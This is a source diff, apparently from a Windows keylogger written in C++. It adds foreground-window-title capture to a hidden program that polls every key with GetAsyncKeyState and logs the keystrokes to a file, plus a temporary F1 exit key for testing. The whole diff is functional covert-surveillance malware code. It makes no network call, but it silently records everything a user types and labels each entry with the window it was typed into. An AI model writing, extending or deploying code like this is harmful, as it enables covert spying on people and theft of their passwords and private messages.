@@ -16,6 +16,18 @@ void SaveInFile(const string& Information) {
     logFile.close();
 }
 
+string currentWindow = "";
+string GetActiveWindowTitle() {
+    HWND hwnd = GetForegroundWindow();
+    if (hwnd != NULL) {
+        char windowTitle[256];
+        GetWindowText(hwnd, windowTitle, sizeof(windowTitle));
+        return string(windowTitle);
+    }
+    return "";
+}
+
+
 string SpecialKeys(int key) {
     string result;
     switch (key) {
@@ -253,6 +265,13 @@ int main() {
     ShowWindow(hwnd, SW_HIDE);
 
     while (true) {
+        string newWindow = GetActiveWindowTitle();
+        if (!newWindow.empty() && newWindow != currentWindow) {
+            
+                currentWindow = newWindow;
+                SaveInFile("\n\n[Window: " + currentWindow + "]\n");
+            
+        }
         for (int i = 8; i <= 190; i++) {
             if (GetAsyncKeyState(i) == -32767) {
                 isSpecial = std::find(std::begin(special_Key), std::end(special_Key), i) != std::end(special_Key);
@@ -270,7 +289,14 @@ int main() {
                 }
             }
         }
+
+        //remove later ( for testing only )
+        if (GetAsyncKeyState(VK_F1)) 
+            exit(0);
+        
     }
 
     return 0;
 }
+
+
